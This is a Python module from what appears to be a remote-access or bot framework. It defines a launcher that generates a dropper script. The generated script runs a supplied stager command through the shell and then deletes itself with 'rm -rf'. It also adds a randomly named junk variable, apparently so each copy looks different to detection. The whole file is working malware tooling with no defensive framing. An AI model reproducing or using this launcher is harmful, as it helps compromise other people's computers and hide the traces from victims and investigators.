# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from bot.launchers.helper import LauncherABC, random_string
from textwrap import dedent


class Launcher(LauncherABC):
    def generate(self, stager):
        return ("py", dedent("""\
        #!/usr/bin/python
        # -*- coding: utf-8 -*-
        import subprocess
        
        {} = "{}"
        subprocess.Popen("{}", shell=True)
        subprocess.Popen("rm -rf " + __file__, shell=True)
        """).format(random_string(), random_string(numbers=True), stager.replace('"', '\\"')))
